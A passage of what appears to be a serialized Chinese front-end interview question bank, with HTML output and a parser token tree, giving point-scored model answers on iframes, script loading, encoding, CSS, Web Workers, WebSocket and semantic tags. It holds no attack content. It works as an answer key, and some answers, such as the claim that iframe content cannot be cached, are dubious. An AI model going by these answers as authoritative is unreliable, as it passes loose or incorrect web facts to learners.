的资源；</li>\\n<li>灵活性强：可以引入各类网站，即使跨域；</li>\\n</ul>\\n</li>\\n<li><strong>2：</strong> 缺点：<ul>\\n<li>不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；</li>\\n<li>性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；</li>\\n<li>通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>谈谈你对 Web 标准以及 W3C 的理解和认识</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。</li>\\n<li><strong>1：</strong> 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。</li>\\n</ul>\\n<h2>什么是严格模式与混杂模式？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。</li>\\n</ul>\\n<h2>script、script async 和 script defer 的区别？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>2：</strong> script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  </p>\\n<p>async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  </p>\\n<p>defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。</p>\\n</li>\\n</ul>\\n<h2>浏览器乱码的原因是什么？如何解决？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>1：原因</strong>\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  </p>\\n<p>  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  </p>\\n<p>  3.浏览器不能自动检测网页编码，造成网页乱码。</p>\\n</li>\\n<li><p><strong>1：解决办法</strong>\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  </p>\\n<p>  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;</p>\\n</li>\\n</ul>\\n<h2>CSS中 link 和@import 的区别是什么？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong>   link属于HTML标签，而@import是CSS提供的页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;  </p>\\n<p>import只在IE5以上才能识别，而link是HTML标签，无兼容问题;  </p>\\n<p>link方式的样式的权重 高于@import的权重。</p>\\n</li>\\n</ul>\\n<h2>CSS中 transition和animation的区别？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  Animation和transition大部分属性是相同的，他们都是随时间改变元素的属性值，他们的主要区别是transition需要触发一个事件才能改变属性，\\n而animation不需要触发任何事件的情况下才会随时间改变属性值，并且transition为2帧，从from .... to，而animation可以一帧一帧的。</li>\\n</ul>\\n<h2>什么是 DOCTYPE， 有何作用？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  Doctype是HTML5的文档声明，通过它可以告诉浏览器，使用哪一个HTML版本标准解析文档。在浏览器发展的过程中，HTML出现过很多版本，不同的版本之间格式书写上略有差异。如果没有事先告诉浏览器，那么浏览器就不知道文档解析标准是什么？此时，大部分浏览器将开启最大兼容模式来解析网页，我们一般称为怪异模式，这不仅会降低解析效率，而且会在解析过程中产生一些难以预知的bug，所以文档声明是必须的。</li>\\n</ul>\\n<h2>HTML5 中的Web Worker是什么？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 基本概念：</p>\\n<ul>\\n<li>运行在后台的JavaScript</li>\\n<li>独立于主线程</li>\\n<li>不会阻塞页面渲染</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 主要特点：</p>\\n<ul>\\n<li>多线程执行</li>\\n<li>消息通信机制</li>\\n<li>独立的运行环境</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用限制：</p>\\n<ul>\\n<li>无法访问DOM</li>\\n<li>无法访问window对象</li>\\n<li>无法访问document对象</li>\\n<li>有同源限制</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 适用场景：</p>\\n<ul>\\n<li>复杂数据处理</li>\\n<li>大量计算</li>\\n<li>图像处理</li>\\n<li>数据加密</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>HTML5 中的WebSocket是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 基本概念：</p>\\n<ul>\\n<li>基于TCP的全双工通信协议</li>\\n<li>服务器可以主动推送数据</li>\\n<li>建立在HTTP协议之上</li>\\n<li>使用ws://或wss://作为协议前缀</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 主要特点：</p>\\n<ul>\\n<li>持久连接</li>\\n<li>全双工通信</li>\\n<li>数据格式轻量</li>\\n<li>更好的实时性</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 与HTTP的区别：</p>\\n<ul>\\n<li>不需要频繁建立连接</li>\\n<li>服务器可以主动推送</li>\\n<li>更低的通信开销</li>\\n<li>无同源限制</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 应用场景：</p>\\n<ul>\\n<li>实时聊天</li>\\n<li>游戏通信</li>\\n<li>实时数据展示</li>\\n<li>协同编辑</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>请简述header、footer、nav、article、section这些语义化标签的作用及使用场景</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  header：通常用于定义页面或区域的头部，可包含网站标志、导航、搜索框等。</li>\\n<li><strong>1：</strong>  footer：用于定义页面或区域的底部，一般放置版权信息、联系方式、友情链接等。</li>\\n<li><strong>1：</strong>  nav：主要用于构建导航链接的区域，方便屏幕阅读器等辅助技术识别导航结构。</li>\\n<li><strong>1：</strong>  article：代表独立的、完整的、可在其他地方复用的内容块，如博客文章、新闻报道等。</li>\\n<li><strong>1：</strong>  section：用于对页面内容进行分块，如章节、主题等，每个section可以有自己的标题等元素。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# HTML\\n\\n","depth":1,"text":"HTML","tokens":[{"type":"text","raw":"HTML","text":"HTML","escaped":false}]},{"type":"heading","raw":"## 什么是静态网页？什么是动态网页？\\n\\n","depth":2,"text":"什么是静态网页？什么是动态网页？","tokens":[{"type":"text","raw":"什么是静态网页？什么是动态网页？","text":"什么是静态网页？什么是动态网页？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","task":false,"loose":false,"text":"**2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","tokens":[{"type":"text","raw":"**2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","text":"**2：** 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","text":" 静态网页：没有与服务端发生交互的网页；动态网页：与服务端有交互的网页","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 谈谈你对 HTML 语义化的理解\\n\\n","depth":2,"text":"谈谈你对 HTML 语义化的理解","tokens":[{"type":"text","raw":"谈谈你对 HTML 语义化的理解","text":"谈谈你对 HTML 语义化的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** What：通过语义化标签对网站进行结构化；\\n- **1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；\\n- **1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** What：通过语义化标签对网站进行结构化；\\n","task":false,"loose":false,"text":"**1：** What：通过语义化标签对网站进行结构化；","tokens":[{"type":"text","raw":"**1：** What：通过语义化标签对网站进行结构化；","text":"**1：** What：通过语义化标签对网站进行结构化；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" What：通过语义化标签对网站进行结构化；","text":" What：通过语义化标签对网站进行结构化；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；\\n","task":false,"loose":false,"text":"**1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","tokens":[{"type":"text","raw":"**1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","text":"**1：** Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","text":" Why：便于浏览器解析，便于特殊设备解析，便于搜索引擎收录，提高代码的可维护性和复用性；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","task":false,"loose":false,"text":"**1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","tokens":[{"type":"text","raw":"**1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","text":"**1：** How：`header`-文档头、`nav`-导航区、`section`-文档块、`article`-内容、`aside`-侧边栏-广告栏、`footer`-文档脚注；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" How：","text":" How：","escaped":false},{"type":"codespan","raw":"`header`","text":"header"},{"type":"text","raw":"-文档头、","text":"-文档头、","escaped":false},{"type":"codespan","raw":"`nav`","text":"nav"},{"type":"text","raw":"-导航区、","text":"-导航区、","escaped":false},{"type":"codespan","raw":"`section`","text":"section"},{"type":"text","raw":"-文档块、","text":"-文档块、","escaped":false},{"type":"codespan","raw":"`article`","text":"article"},{"type":"text","raw":"-内容、","text":"-内容、","escaped":false},{"type":"codespan","raw":"`aside`","text":"aside"},{"type":"text","raw":"-侧边栏-广告栏、","text":"-侧边栏-广告栏、","escaped":false},{"type":"codespan","raw":"`footer`","text":"footer"},{"type":"text","raw":"-文档脚注；","text":"-文档脚注；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 谈谈你对锚点的理解\\n\\n","depth":2,"text":"谈谈你对锚点的理解","tokens":[{"type":"text","raw":"谈谈你对锚点的理解","text":"谈谈你对锚点的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；\\n- **1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；\\n","task":false,"loose":false,"text":"**1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","tokens":[{"type":"text","raw":"**1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","text":"**1：** What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","text":" What & Why：文档中某一行的记号，用于链接到文档中指定的位置；避免用户频繁滚动页面，提升用户体验；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","task":false,"loose":false,"text":"**1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","tokens":[{"type":"text","raw":"**1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","text":"**1：** How：`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`、`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`、``；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" How：","text":" How：","escaped":false},{"type":"codespan","raw":"`<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>`","text":"<h2 id=\\"know\\">谈谈你对锚点的理解 <a href=\\"#know\\">​</a></h2>"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>`","text":"<div><a name=\\"know\\">​</a><a href=\\"#know\\">​</a></div>"},{"type":"text","raw":"、``；","text":"、``；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 超链接有哪些常见的表现形式？\\n\\n","depth":2,"text":"超链接有哪些常见的表现形式？","tokens":[{"type":"text","raw":"超链接有哪些常见的表现形式？","text":"超链接有哪些常见的表现形式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：**\\n  + 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n  + 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n  + 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n  + 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n  + 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n  + 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：**\\n  + 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n  + 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n  + 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n  + 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n  + 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n  + 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","task":false,"loose":false,"text":"**2：**\\n+ 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n+ 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n+ 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n+ 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n+ 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n+ 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","tokens":[{"type":"text","raw":"**2：**\\n","text":"**2：**","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]}]},{"type":"list","raw":"+ 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n+ 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n+ 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n+ 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n+ 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n+ 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`\\n","task":false,"loose":false,"text":"跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`","tokens":[{"type":"text","raw":"跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`","text":"跳转链接：页面跳转，`<a href=\\"http://www.baidu.com\\">百度</a>`","tokens":[{"type":"text","raw":"跳转链接：页面跳转，","text":"跳转链接：页面跳转，","escaped":false},{"type":"codespan","raw":"`<a href=\\"http://www.baidu.com\\">百度</a>`","text":"<a href=\\"http://www.baidu.com\\">百度</a>"}]}]},{"type":"list_item","raw":"+ 下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`\\n","task":false,"loose":false,"text":"下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`","tokens":[{"type":"text","raw":"下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`","text":"下载链接：下载资源，`<a href=\\"data.zip\\">本地</a>`","tokens":[{"type":"text","raw":"下载链接：下载资源，","text":"下载链接：下载资源，","escaped":false},{"type":"codespan","raw":"`<a href=\\"data.zip\\">本地</a>`","text":"<a href=\\"data.zip\\">本地</a>"}]}]},{"type":"list_item","raw":"+ 锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`\\n","task":false,"loose":false,"text":"锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`","tokens":[{"type":"text","raw":"锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`","text":"锚点链接：锚点跳转，`<a href=\\"#know\\">​</a>`","tokens":[{"type":"text","raw":"锚点链接：锚点跳转，","text":"锚点链接：锚点跳转，","escaped":false},{"type":"codespan","raw":"`<a href=\\"#know\\">​</a>`","text":"<a href=\\"#know\\">​</a>"}]}]},{"type":"list_item","raw":"+ 邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`\\n","task":false,"loose":false,"text":"邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`","tokens":[{"type":"text","raw":"邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`","text":"邮箱链接：唤起邮箱，`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`","tokens":[{"type":"text","raw":"邮箱链接：唤起邮箱，","text":"邮箱链接：唤起邮箱，","escaped":false},{"type":"codespan","raw":"`<a href=\\"mailto:xxx@xxx.com\\">xxx</a>`","text":"<a href=\\"mailto:xxx@xxx.com\\">xxx</a>"}]}]},{"type":"list_item","raw":"+ 空链接：返回页面顶部，`<a href=\\"\\">​</a>`\\n","task":false,"loose":false,"text":"空链接：返回页面顶部，`<a href=\\"\\">​</a>`","tokens":[{"type":"text","raw":"空链接：返回页面顶部，`<a href=\\"\\">​</a>`","text":"空链接：返回页面顶部，`<a href=\\"\\">​</a>`","tokens":[{"type":"text","raw":"空链接：返回页面顶部，","text":"空链接：返回页面顶部，","escaped":false},{"type":"codespan","raw":"`<a href=\\"\\">​</a>`","text":"<a href=\\"\\">​</a>"}]}]},{"type":"list_item","raw":"+ 代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","task":false,"loose":false,"text":"代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","tokens":[{"type":"text","raw":"代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","text":"代码块：执行代码，`<a href=\\"javascript:void(0);\\">​</a>`","tokens":[{"type":"text","raw":"代码块：执行代码，","text":"代码块：执行代码，","escaped":false},{"type":"codespan","raw":"`<a href=\\"javascript:void(0);\\">​</a>`","text":"<a href=\\"javascript:void(0);\\">​</a>"}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## img 标签的 title 和 alt 属性作用\\n\\n","depth":2,"text":"img 标签的 title 和 alt 属性作用","tokens":[{"type":"text","raw":"img 标签的 title 和 alt 属性作用","text":"img 标签的 title 和 alt 属性作用","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","task":false,"loose":false,"text":"**1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","tokens":[{"type":"text","raw":"**1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","text":"**1：** `title`属性是当鼠标悬停在图片上时，显示的提示文本；`alt`属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" 